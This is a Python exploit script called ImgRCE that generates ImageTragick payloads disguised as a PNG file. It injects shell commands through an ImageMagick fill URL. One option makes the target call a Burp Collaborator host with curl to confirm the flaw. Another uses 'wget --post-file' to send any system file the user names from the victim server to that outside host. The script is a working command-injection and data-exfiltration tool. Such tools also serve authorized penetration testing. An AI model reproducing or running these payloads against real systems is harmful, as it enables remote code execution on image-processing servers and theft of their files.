#!/usr/bin/env python
#!ImgRCE
#!Author: Ankit Singh
name = """

  ___ __  __  ____ ____   ____ _____ 
 |_ _|  \/  |/ ___|  _ \ / ___| ____|
  | || |\/| | |  _| |_) | |   |  _|  
  | || |  | | |_| |  _ <| |___| |___ 
 |___|_|  |_|\____|_| \_\\___ _|_____|
\tAuthor - Ankit Singh @ankitk323
\tImgRCE - Image Tragick Exploit Using Burp Collaborator

"""

print(name)

Collaborator=(input("\n[*] Enter the Burp Collaborator Link> "))

command_1="""push graphic-context 
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg "|curl %s")'
pop graphic-context
"""%(Collaborator)

def check():
    with open("imgrce.png","w") as img:
        print("-"*20)
        print("Exploit Created!.. visit the Collaborator")
        print("-"*20)
        img.write(command_1)
        img.close()
        out = (input("[*] Do you want to exit y/n> "))
        if out == "y":
            print("\nThanks")
            exit()
        elif out == "n":
            return()
        else:
            print("[*] Please select yes or no.")

def system_file():
    with open("imgrce.png","w") as img:
        print("-"*20)
        print("Exploit Created!.. visit the Collaborator")
        print("-"*20)
        img.write(command_2)
        img.close()
        out = (input("[*] Do you want to exit y/n> "))
        if out == "y":
            print("\nThanks")
            exit()
        elif out == "n":
            return()
        else:
            print("[*] Please select yes or no.")


if ".oastify.com" in Collaborator:
    active = True
    while active:
        print("\n[0] Press 0 to exit from script")
        print("[1] Press 1 to check the vulnerability")
        print("[2] Press 2 to exploit the vulnerability")
        select = int(input("\n[*] Select the option> "))
        if select == 0:
            print("\nThanks")
            exit()
        elif select == 1:
            check()
        elif select == 2:
            file =(input("[*] Enter the System file name> "))
            command_2="""push graphic-context 
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg "|wget --post-file %s %s")'
pop graphic-context
            """%(file,Collaborator)
            system_file()
        else:
            print("\n>Error, Enter The Correct Number!!")
else:
    print("\n>Error, Enter Correct link!!")
